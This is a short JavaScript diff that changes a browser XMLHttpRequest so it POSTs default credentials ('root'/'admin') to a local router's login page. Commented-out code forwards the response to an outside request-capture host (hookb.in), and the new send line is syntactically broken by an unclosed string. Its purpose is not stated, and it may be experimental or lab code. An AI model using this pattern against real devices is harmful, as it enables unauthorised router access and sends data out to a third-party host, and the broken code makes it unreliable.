@@ -1,5 +1,5 @@
 const http = new XMLHttpRequest();
-http.open('GET', 'http://router.local', true);
+http.open('POST', 'http://router.local/login.php', true);
 // http.addEventListener('load', function (event) {
 //     const xhr = new XMLHttpRequest();
 //     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
@@ -18,4 +18,4 @@ http.onload = function () {
 };
 //http.open('GET', 'http://router.local/login.php/');
 //"username=root&pin=admin¬Robot=on"
-http.send();
+http.send("username=root&pin=admin);
